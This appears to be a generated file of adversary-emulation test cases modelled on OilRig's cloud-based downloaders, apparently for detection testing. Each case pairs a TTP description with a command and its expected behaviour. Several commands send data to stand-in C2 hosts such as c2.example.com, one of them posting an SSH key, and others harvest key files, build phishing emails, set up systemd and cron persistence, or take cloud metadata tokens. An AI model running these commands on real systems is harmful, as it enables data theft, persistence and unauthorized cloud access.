extracted_ttps.description: The attacker uses email drafts with specific extended properties and attachments to potentially download or execute files on the victim's system.
The attacker relies on the victim to execute the malicious files or commands, potentially through email attachments or downloads.
The attacker uses a Microsoft Office 365 Outlook account for C&C communication, accessing it via the EWS API with hardcoded credentials.
OilRig's cloud service-powered downloaders blend into regular network traffic by utilizing cloud storage services and cloud-based email providers for C&C communications
OilRig's downloaders access a shared email or cloud storage account to download commands and additional payloads, and to upload command output and staged files
The downloaders use a command and scripting interpreter to process commands and payloads downloaded from the shared account
The attacker collects data from the local system, including the system volume ID and computer name, to generate a unique victim ID.
OilRig downloaders are transferred to the system, potentially through cloud services
The attacker potentially uses command-line interfaces or scripting interpreters to execute commands or download files.
OilBooster uses the Microsoft Graph API to access a shared OneDrive account, which may involve phishing to obtain credentials
The attacker uses a downloader thread to execute downloaded payloads from an attacker-controlled OneDrive account
OilRig uses cloud service-powered downloaders to maintain access to target organizations
indicators: Microsoft Office Exchange Web Services (EWS) API

extracted_ttps.description: OilBooster creates a new file named setting.ini in the victim's OneDrive subdirectory to record the last connection timestamp

The attacker relies on the victim to execute the malware, which then connects to the C&C server.
The initial attack vector used to compromise the targets is unknown, but the attackers may have used phishing or other social engineering tactics to gain access
The downloader thread iterates through files with specific extensions (.doc, .docx) in the OneDrive account
OilRig downloaders use legitimate cloud service APIs for C&C communication and data exfiltration

attacks.command: powershell -Command "$ol = New-Object -ComObject Outlook.Application; $mail = $ol.CreateItem(0); $mail.To = 'test@example.com'; $mail.Subject = 'Important Document'; $mail.Body = 'Please review attached file.'; $mail.Attachments.Add('%TEMP%\test.txt'); $mail.Save()"
attacks.description: Creates Outlook email draft with benign text file attachment
attacks.expected_behavior: Outlook draft email created in user's drafts folder with test.txt attachment

attacks.description: Sets extended MAPI property with URL and attaches PDF
attacks.expected_behavior: Email draft with custom extended property and attachment saved; no network call made

attacks.description: Advanced encoded command to create draft with extended property pointing to calc.exe
attacks.expected_behavior: Encoded script creates draft with MAPI property referencing calc.exe and attaches a text file

attacks.command: sh -c 'echo -e "#!/bin/bash\necho \"Hello World\"" > /tmp/fake.sh && chmod +x /tmp/fake.sh && { echo "From: attacker@example.com"; echo "To: victim@example.com"; echo "Subject: Important Update"; echo "MIME-Version: 1.0"; echo "Content-Type: multipart/mixed; boundary=\"BOUNDARY\""; echo ""; echo "--BOUNDARY"; echo "Content-Type: text/plain; charset=\"UTF-8\""; echo ""; echo "Please see the attached script."; echo ""; echo "--BOUNDARY"; echo "Content-Type: application/octet-stream; name=\"update.sh\""; echo "Content-Transfer-Encoding: base64"; echo "Content-Disposition: attachment; filename=\"update.sh\""; echo ""; base64 /tmp/fake.sh; echo "--BOUNDARY--"; } > /tmp/phish_draft.eml'
attacks.description: Creates a benign script, then builds a simple .eml draft containing the script as a base64‑encoded attachment.
attacks.expected_behavior: A file /tmp/phish_draft.eml is created; it contains MIME headers, a plain‑text body, and the base64‑encoded fake script as an attachment.

attacks.command: echo "Please review the attached file." | mutt -s "Security Update" -a /tmp/fake.sh -- victim@example.com -e "set edit_headers=yes; my_hdr X-Phishing-Info: malicious"
attacks.description: Uses mutt to compose an email draft with a custom X‑Phishing‑Info header and attaches the previously created fake script.
attacks.expected_behavior: Mutt opens a compose window (or sends directly in batch mode) with the subject, body, attachment, and the extra header; no network traffic is required in the test environment.

attacks.command:
(printf "From: attacker@example.com
"; printf "To: victim@example.com
"; printf "Subject: Critical Patch
"; printf "X-Phishing-Info: malicious
"; printf "MIME-Version: 1.0
"; printf "Content-Type: multipart/mixed; boundary="BOUNDARY"

"; printf "--BOUNDARY
"; printf "Content-Type: text/plain; charset="UTF-8"

"; printf "Please apply the attached patch.

"; printf "--BOUNDARY
"; printf "Content-Type: application/octet-stream; name="patch.sh"
"; printf "Content-Transfer-Encoding: base64
"; printf "Content-Disposition: attachment; filename="patch.sh"

"; base64 /tmp/fake.sh; printf "
--BOUNDARY--
") | /usr/sbin/sendmail -t
attacks.description: Crafts a raw MIME message with an X‑Phishing‑Info header and a base64‑encoded attachment, then pipes it to sendmail to simulate sending a phishing draft.
attacks.expected_behavior: sendmail processes the input and attempts to deliver the message; in a test environment it will create the appropriate mail queue entry without contacting external servers.

attacks.expected_behavior: Notepad opens with a test file

attacks.expected_behavior: A test file is created and opened

attacks.description: Compress a test file in the temp directory
attacks.expected_behavior: A test file is compressed into a zip archive

attacks.expected_behavior: Decodes and executes 'touch /tmp/base64_test' command via bash after base64 decoding

attacks.expected_behavior: Simulates authenticated file download with test credentials. No real authentication occurs due to test token.

attacks.description: Downloads and executes a script to simulate staged payload execution.

attacks.description: Basic: Creates a test script in %TEMP% and executes it using cmd.exe

attacks.description: Collects basic system information including computer name, which can be used to generate a unique victim ID.
attacks.expected_behavior: Displays system information in the command prompt.

attacks.command: wmic os get localdatetime && wmic diskdrive get status
attacks.description: Collects the local date and time and the status of disk drives, which can include the system volume ID, contributing to a unique identifier.
attacks.expected_behavior: Displays the current local date and time and the status of disk drives.

attacks.description: Uses PowerShell to collect the machine name and volume names of logical disks, which can be used to create a unique identifier for the system.
attacks.expected_behavior: Displays the machine name and volume names in the PowerShell console.

attacks.description: Collects hostname and lists disk UUIDs from /dev/disk/by-uuid
attacks.expected_behavior: Outputs the system's hostname followed by the list of disk UUIDs available to the user

attacks.description: Generates a SHA-256 hash of the hostname combined with the machine ID to create a unique victim ID
attacks.expected_behavior: Computes a unique identifier hash from system hostname and machine ID

attacks.description: Retrieves the system UUID using dmidecode (requires root privileges)
attacks.expected_behavior: Outputs the system's UUID, which requires elevated privileges to access

attacks.description: Basic example: Write a benign string to a file in the %TEMP% directory using the echo command.
attacks.expected_behavior: A file named test_tool.txt will be created in the %TEMP% directory with the contents 'Test Tool'.

attacks.description: Intermediate example: Use PowerShell to write a benign string to a file in the %TEMP% directory.
attacks.expected_behavior: A file named test_tool.txt will be created in the %TEMP% directory with the contents 'Test Tool'.

attacks.description: Advanced example: Use certutil to download a file from a URL and save it to the %TEMP% directory. Note: This command assumes the URL is accessible and the file is not malicious.
attacks.expected_behavior: A file named test_tool.txt will be downloaded from the specified URL and saved to the %TEMP% directory.

attacks.description: Basic file download from a cloud-hosted URL using wget
attacks.expected_behavior: Downloads testfile from example.com to /tmp directory using HTTP

attacks.expected_behavior: Silently downloads file from simulated AWS S3 bucket to user's home directory

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic EWS exfiltration with test data via POST request
attacks.expected_behavior: Sends XML-formatted test data to specified URI using EWS-like SOAP structure. Server may respond with 404 but network traffic shows attempt.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command:
powershell -Command "Compress-Archive -Path $env:TEMP\testfile.txt -DestinationPath $env:TEMP\data.zip -Force; $zipData = Get-Content $env:TEMP\data.zip -Encoding Byte -Raw; $uri = 'https://example.com/ews/exchange.asmx'; $boundary='BOUNDARYTEST'; Invoke-WebRequest -Uri $uri -Method Post -ContentType "multipart/related; boundary=${boundary}" -Body ("--${boundary}
Content-Type: application/octet-stream

$zipData
--${boundary}--"); Remove-Item $env:TEMP\data.zip -ErrorAction SilentlyContinue"
attacks.description: Intermediate file compression and multipart EWS upload
attacks.expected_behavior: Creates ZIP archive of test file, sends via EWS-style multipart POST, then cleans up. Shows file attachment pattern in C2 traffic.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: powershell -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $chunkSize=512; $fileData = [System.IO.File]::ReadAllBytes('$env:TEMP\largefile.bin'); for ($i=0; $i -lt $fileData.Length; $i+=$chunkSize) { $chunk = $fileData[$i..($i+$chunkSize-1)]; $encoded = [System.Convert]::ToBase64String($chunk); try { Invoke-WebRequest -Uri 'https://example.com/ews/exchange.asmx' -Method Post -Body "<soap:Envelope><soap:Body><Chunk index='${i}'>${encoded}</Chunk></soap:Body></soap:Envelope>" -ContentType 'text/xml' } catch {} }"
attacks.description: Advanced chunked exfiltration with certificate validation bypass
attacks.expected_behavior: Splits large file into base64-encoded chunks sent via EWS-style requests. Bypasses SSL validation and includes error handling for robust transmission.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration: send the content of /etc/hostname to the C2 server using a simple HTTP POST.
attacks.expected_behavior: The hostname string is transmitted to the C2 endpoint; curl returns silently with an HTTP 200 response if the server is reachable.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: tar -czf /tmp/data.tar.gz /var/log && base64 /tmp/data.tar.gz | curl -s -X POST -H "Content-Type: application/octet-stream" --data-binary @- https://c2.example.com/ews && rm -f /tmp/data.tar.gz
attacks.description: Intermediate exfiltration: archive the /var/log directory, base64‑encode the archive, and transmit it over HTTP to the C2 server, then clean up the temporary archive.
attacks.expected_behavior: A compressed, base64‑encoded log archive is sent to the C2 endpoint; the temporary file is removed after transmission. The command succeeds without interactive output.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command:
cat <<'EOF' > /tmp/ews_request.xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <CreateItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
      <Items>
        <Message>
          <Subject>Exfiltration</Subject>
          <Body BodyType="Text">$(cat /home/$USER/.ssh/id_rsa.pub)</Body>
          <ToRecipients>
            <Mailbox>
              <EmailAddress>attacker@example.com</EmailAddress>
            </Mailbox>
          </ToRecipients>
        </Message>
      </Items>
    </CreateItem>
  </soap:Body>
</soap:Envelope>
EOF
curl -s -X POST -H "Content-Type: text/xml" --data-binary @/tmp/ews_request.xml https://c2.example.com/EWS/Exchange.asmx && rm -f /tmp/ews_request.xml
attacks.description: Advanced exfiltration: construct a SOAP request containing the user's SSH public key and send it to the C2 server's EWS endpoint, then delete the temporary XML file.
attacks.expected_behavior: The SOAP envelope with the embedded SSH key is posted to the EWS endpoint; the server processes the request and returns an HTTP response. The temporary XML file is removed after the request.

attacks.description: Basic simulation of inter-process communication using a pipe to pass output from one command to another (echo to more).
attacks.expected_behavior: The string 'test_command' is passed through a pipe and displayed by the 'more' command. This demonstrates basic IPC via standard command piping in Windows.

attacks.command: powershell -Command "& { $p = Start-Process cmd -ArgumentList '/c echo piped_data' -RedirectStandardOutput $env:TEMP\ipc_test_out.txt -PassThru; $p.WaitForExit() } ; Get-Content $env:TEMP\ipc_test_out.txt -ErrorAction SilentlyContinue; Remove-Item $env:TEMP\ipc_test_out.txt -ErrorAction SilentlyContinue"
attacks.description: Intermediate use of PowerShell to launch a process and capture its output via redirected standard output (simulating unnamed pipe access).
attacks.expected_behavior: A cmd process runs 'echo piped_data', writes output to a temporary file, which is then read and displayed. The file is cleaned up afterward. This simulates reading command results via redirected output (IPC-like behavior).

attacks.command: powershell -Command "$sp = Start-Process cmd -ArgumentList '/c dir %SYSTEMROOT%\\system32 /b' -RedirectStandardOutput $env:TEMP\\dir_results.txt -WindowStyle Hidden -PassThru; $sp.WaitForExit(); $content = Get-Content $env:TEMP\\dir_results.txt -ErrorAction SilentlyContinue; if ($content) { echo "Received data via IPC simulation:"; $content | ForEach-Object { echo "  $_" } }; Remove-Item $env:TEMP\\dir_results.txt -ErrorAction SilentlyContinue"
attacks.description: Advanced simulation of IPC by spawning a process with redirected output, retrieving results, and processing them in the parent process.
attacks.expected_behavior: The 'dir' command runs hidden and lists files in system32, output redirected to a temp file. Parent PowerShell reads and prints each line, simulating IPC data exchange. Temp file is removed afterward. No system changes occur.

attacks.description: This command uses PowerShell to invoke a web request to the Microsoft Graph API to retrieve the current user's profile, simulating interaction with cloud compute infrastructure.
attacks.expected_behavior: The command should successfully retrieve the user's profile information if authenticated correctly, demonstrating the ability to interact with cloud services.

attacks.description: This command adds an Azure RM account to the current PowerShell session, allowing for further management and modification of Azure resources, which is a part of modifying cloud compute infrastructure.
attacks.expected_behavior: The command should prompt for credentials and then add the Azure account, enabling subsequent Azure resource management commands.

attacks.description: This command creates a new Azure Virtual Machine, demonstrating the modification of cloud compute infrastructure by provisioning new resources.
attacks.expected_behavior: The command should create a new virtual machine in Azure, requiring appropriate credentials and permissions, and demonstrating the capability to modify cloud infrastructure.

attacks.description: Creates Azure service principal with Contributor role
attacks.expected_behavior: Creates new service principal in Azure AD with 1-year credential validity, granting persistent cloud access

attacks.command: pwsh -Command "Install-Module Microsoft.Graph -Force -Scope CurrentUser; Connect-MgGraph -AccessToken (az account get-access-token --resource https://graph.microsoft.com -o tsv --query accessToken); New-MgServicePrincipalFederatedIdentityCredential -ServicePrincipalId '<SP_ID>' -BodyParameter @{name='test-creds'; issuer='https://sts.windows.net/<TENANT_ID>/'; subject='test-subject'; audiences=@('api://AzureADTokenExchange')}"
attacks.description: Adds federated identity credential to service principal via Microsoft Graph
attacks.expected_behavior: Configures OIDC federation credentials allowing token exchange authentication to Azure resources

attacks.command: curl -X PATCH -H "Authorization: Bearer $(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true | jq -r .access_token)" -H "Content-Type: application/json" -d '{"properties":{"virtualMachineProfile":{"extensionProfile":{"extensions":[{"name":"testExtension","properties":{"publisher":"Microsoft.Azure.Extensions","type":"CustomScript","typeHandlerVersion":"2.0","autoUpgradeMinorVersion":true,"settings":{"commandToExecute":"echo test"}}}]}}}}' https://management.azure.com/subscriptions/{SubID}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachineScaleSets/{VMSSName}?api-version=2023-03-01
attacks.description: Modifies VM scale set configuration using managed identity
attacks.expected_behavior: Adds benign custom script extension to VM scale set configuration via Azure management API

attacks.description: Create a test directory using PowerShell, ensuring the directory is created without error if it already exists.
attacks.expected_behavior: A new directory named '_TestDirectory' is created in the root of C:\, or the command silently continues if the directory already exists.

attacks.description: Create a test directory using the legacy cmd.exe, which is preferred for detection matching.
attacks.expected_behavior: A new directory named '_TestDirectory' is created in the root of C:\.

attacks.description: Using PowerShell to create a new directory with error handling to ensure the command does not fail if the directory already exists.
attacks.expected_behavior: A new directory named '_TestDirectory' is created in the root of C:\, or the command silently continues if the directory already exists.

attacks.description: Basic discovery: list the contents of the user's OneDrive sync folder to verify its presence.
attacks.expected_behavior: Outputs a directory listing of $HOME/OneDrive; if the folder does not exist, an error message is shown.

attacks.description: Intermediate: ensure a victim‑specific subdirectory exists in the shared OneDrive folder and display its details.
attacks.expected_behavior: Creates $HOME/OneDrive/victim_<username> if it does not exist, then prints the directory's permission and ownership information.

attacks.command: existing=$(find "$HOME/OneDrive" -maxdepth 1 -mindepth 1 -type d -printf "%f\n" 2>/dev/null) && echo "Existing subfolders: $existing" && mkdir -m 700 -p "$HOME/OneDrive/.marker_$(date +%s)" && ls -ld "$HOME/OneDrive/.marker_$(date +%s)"
attacks.description: Advanced: enumerate current OneDrive subdirectories, then create a hidden marker directory with restrictive permissions for the victim.
attacks.expected_behavior: Lists names of existing subfolders under $HOME/OneDrive, creates a hidden directory named .marker_<timestamp> with mode 700, and shows its details.

attacks.command: powershell -Command "Compress-Archive -Path '%TEMP%\testfile.txt' -DestinationPath '%TEMP%\collected.zip' -Force; Start-Process cmd -ArgumentList '/c, echo Collected file > %TEMP%\collected.log'
attacks.description: Basic: Collect a test file, compress it, and log the collection event.
attacks.expected_behavior: A zip file and a log file are created in the temp directory.

attacks.description: Intermediate: Collect text files from the temp directory, create a list, encode it, and save as a new file.
attacks.expected_behavior: A text file containing the list of files and an encoded version of this list are created in the temp directory.

attacks.description: Basic automated collection: Copy shell history files from user home directories to a temporary folder
attacks.expected_behavior: Creates a directory in /tmp and copies any .bash_history files from user home directories into it. Fails silently if no such files exist.

attacks.command: mkdir -p /tmp/col_$(date +%s) && find /home -type f -name '*.ssh' -o -name '*.pgp' -o -name '*.key' 2>/dev/null | xargs cp -t /tmp/col_$(date +%s)/ 2>/dev/null || true
attacks.description: Intermediate automated collection: Find and copy sensitive files (SSH, PGP, key files) from home directories
attacks.expected_behavior: Creates a timestamped directory in /tmp and attempts to copy files with sensitive extensions into it using find and xargs. Errors are suppressed.

attacks.command: tmpdir="/tmp/collect_$$"; mkdir -p "$tmpdir" && find /home -type f \( -name '*.pdf' -o -name '*.docx' -o -name '*.xlsx' \) -size -1M 2>/dev/null | xargs cp -t "$tmpdir" 2>/dev/null; tar -czf "/tmp/col_$(date +%Y%m%d).tar.gz" -C "$tmpdir" . 2>/dev/null; rm -rf "$tmpdir"
attacks.description: Advanced automated collection: Find small document files, archive them into a compressed tarball, and clean up
attacks.expected_behavior: Creates a temporary directory, copies small document files from /home, compresses them into a dated .tar.gz archive in /tmp, then removes the working directory.

attacks.description: Create a new service using net.exe
attacks.expected_behavior: A new service will be created and started.

attacks.description: Modify an existing service using sc.exe
attacks.expected_behavior: The upnphost service will be modified to start automatically.

attacks.description: Create a new process using PowerShell
attacks.expected_behavior: A new notepad process will be created.

attacks.command:
echo '[Unit]
Description=Test Service
[Service]
ExecStart=/bin/sh -c "while true; do touch /tmp/test_service.log; sleep 60; done"
[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/test_service.service && sudo systemctl enable test_service.service
attacks.description: Create and enable a persistent systemd service that touches a test file
attacks.expected_behavior: Creates a new systemd service that runs indefinitely, writing to /tmp/test_service.log every 60 seconds. Service persists across reboots.

attacks.description: Add user-level cron job for persistence on reboot
attacks.expected_behavior: Adds a cron job that executes at reboot to create /tmp/persist_test. Runs under user context without root privileges.

attacks.command:
sudo bash -c 'echo -e "[Unit]
Description=Advanced Timer

[Timer]
OnCalendar=*-*-* *:*:00
Unit=test_service.service

[Install]
WantedBy=timers.target" > /etc/systemd/system/adv_timer.timer && systemctl enable --now adv_timer.timer'
attacks.description: Create and activate systemd timer triggering every minute
attacks.expected_behavior: Creates a systemd timer unit that activates every minute. Requires existing test_service.service. Persists across reboots via enablement.

attacks.description: Encode a benign string in Base64 using certutil to simulate obfuscated file storage.
attacks.expected_behavior: Creates a Base64-encoded file in %TEMP%, decodes it to a .bat file using certutil, and displays its content. Output should be 'Benign Script'.

attacks.description: Obfuscate a string using XOR encoding in PowerShell, then write to file.
attacks.expected_behavior: Applies XOR 42 to each byte of 'U2NyIHB0IChOb3QgTWFsaWNpb3Vz)' (Base64-like but not valid), outputs obfuscated text to %TEMP%\xor_output.txt, and displays it. Result is non-printable or garbled, demonstrating XOR obfuscation.

attacks.command: echo IyEvYmluL3BpZ2FsaW5nDWNhbGwgbm90IG1hbGljaW91cyBzdHVi | certutil -decode - > "%TEMP%\stage1.ps1" & powershell -Command "if (Test-Path '%TEMP%\stage1.ps1') { $content = Get-Content '%TEMP%\stage1.ps1' -Raw; $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($content)); $decoded | Out-File '%TEMP%\final.txt' -Force } else { exit 1 }"
attacks.description: Simulate multi-stage obfuscation: decode Base64 with certutil, then re-decode embedded Base64 in PowerShell.
attacks.expected_behavior: First, decodes a Base64 string (which is garbage) into a file using certutil. Then, PowerShell reads it and attempts to decode it again as Base64. Fails gracefully if invalid, but demonstrates layered obfuscation. Output in %TEMP%\final.txt will be minimal or empty, but process shows obfuscation chaining.

attacks.command: echo -e '#!/bin/bash\necho "Hello, world!"' > $HOME/hello.sh && chmod +x $HOME/hello.sh && base64 $HOME/hello.sh > $HOME/hello.b64 && rm $HOME/hello.sh && base64 -d $HOME/hello.b64 > $HOME/hello_dec.sh && chmod +x $HOME/hello_dec.sh && $HOME/hello_dec.sh
attacks.description: Basic obfuscation: encode a simple script with Base64, then decode and execute it.
attacks.expected_behavior: Creates a script that prints 'Hello, world!', encodes it to Base64, deletes the original, decodes it back, restores execute permission, and runs the decoded script.

attacks.command: printf '#!/bin/bash\necho "Intermediate test"\n' > $HOME/inter.sh && chmod +x $HOME/inter.sh && gzip -c $HOME/inter.sh | base64 > $HOME/inter.gz.b64 && rm $HOME/inter.sh && base64 -d $HOME/inter.gz.b64 | gunzip > $HOME/inter_dec.sh && chmod +x $HOME/inter_dec.sh && $HOME/inter_dec.sh
attacks.description: Intermediate obfuscation: compress a script with gzip, then Base64‑encode it before decoding, decompressing, and executing.
attacks.expected_behavior: Creates a script that prints 'Intermediate test', compresses and Base64‑encodes it, removes the original, decodes and decompresses back to a script, restores execute permission, and runs it.

attacks.command: printf '#!/bin/bash\necho "Advanced obfuscation test"\n' > $HOME/adv.sh && chmod +x $HOME/adv.sh && openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:SuperSecret -in $HOME/adv.sh -out $HOME/adv.enc && base64 $HOME/adv.enc > $HOME/adv.enc.b64 && rm $HOME/adv.sh $HOME/adv.enc && export ENC_PASS=SuperSecret && base64 -d $HOME/adv.enc.b64 > $HOME/adv.enc && openssl enc -d -aes-256-cbc -salt -pbkdf2 -pass env:ENC_PASS -in $HOME/adv.enc -out $HOME/adv_dec.sh && chmod +x $HOME/adv_dec.sh && $HOME/adv_dec.sh && unset ENC_PASS && rm $HOME/adv.enc $HOME/adv.enc.b64 $HOME/adv_dec.sh
attacks.description: Advanced obfuscation: encrypt a script with OpenSSL, Base64‑encode the ciphertext, then decode, decrypt using an environment variable, and execute the recovered script.
attacks.expected_behavior: Creates a script that prints 'Advanced obfuscation test', encrypts it with AES‑256‑CBC using a password, encodes the encrypted file with Base64, deletes the cleartext files, decodes and decrypts at runtime using a temporary environment variable, restores execute permission, runs the script, then cleans up all temporary artifacts.

attacks.description: Archive a test file using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: Creates a zip archive of a test file in the temporary directory.

attacks.description: Use the makecab command to create a cabinet archive of a test file.
attacks.expected_behavior: Creates a cabinet archive of a test file in the temporary directory.

attacks.description: Use PowerShell with .NET's ZipFile class to archive a directory.
attacks.expected_behavior: Archives a directory using .NET's ZipFile class.

attacks.description: Creates a gzip‑compressed tar archive of a single test file (secret.txt) located in /tmp.
attacks.expected_behavior: A file named archive_basic.tar.gz appears in /tmp containing secret.txt.

attacks.description: Creates a zip archive of two user‑owned files in /tmp, demonstrating collection of multiple artifacts.
attacks.expected_behavior: A file named archive_intermediate.zip is created in /tmp containing data1.txt and data2.log.

attacks.description: Archives privileged system log files using sudo, then changes ownership so the current user can access the archive.
attacks.expected_behavior: A gzip‑compressed tar file archive_advanced.tar.gz is created in /tmp containing syslog and auth.log, owned by the invoking user.

attacks.description: Establish a Remote Desktop connection to the specified IP address.
attacks.expected_behavior: Initiates an RDP connection to the target IP address, prompting for credentials if necessary.

attacks.description: Add credentials for RDP connection to the specified IP address.
attacks.expected_behavior: Stores the credentials for the RDP connection, which can be used for lateral movement.

attacks.description: Enumerate files in the Remote Desktop Connection directory using PowerShell.
attacks.expected_behavior: Lists files related to Remote Desktop Connection, demonstrating interaction with RDP components.

attacks.description: Basic RDP connection to a target host
attacks.expected_behavior: Initiates an RDP session to 192.168.1.100 using rdesktop, triggering RDP detection patterns.

attacks.description: Intermediate RDP connection with credentials and clipboard redirection
attacks.expected_behavior: Connects with credentials via xfreerdp, demonstrating credential usage and clipboard sharing for detection.

attacks.description: Advanced SSH tunneling with RDP connection through local port forward
attacks.expected_behavior: Creates SSH tunnel to pivot through jumphost, then connects via localhost to demonstrate evasion tactics.

attacks.description: Basic batch file creation and execution via cmd
attacks.expected_behavior: Creates test.bat in TEMP directory containing 'echo Test' and executes it, displaying output in console

attacks.description: Intermediate PowerShell script generation and execution
attacks.expected_behavior: Creates test.ps1 script in TEMP directory and launches it in new PowerShell process, displaying 'Test' output

attacks.description: Advanced base64 payload decoding via certutil and execution
attacks.expected_behavior: Decodes base64 'echo Test' payload to batch file using certutil and executes it, demonstrating file reconstruction technique

attacks.description: Creates a simple malicious shell script in the user's home directory, makes it executable, and runs it directly.
attacks.expected_behavior: A file 'malicious.sh' is created, marked executable, and when run prints 'Malicious script executed' to stdout.

attacks.description: Downloads a base64-encoded dummy binary to /tmp, makes it executable, and executes it, simulating a user-run malicious file.
attacks.expected_behavior: The dummy binary is written, marked executable, and when executed may produce no visible output (as it's placeholder data). The command tests detection of file download and execution.
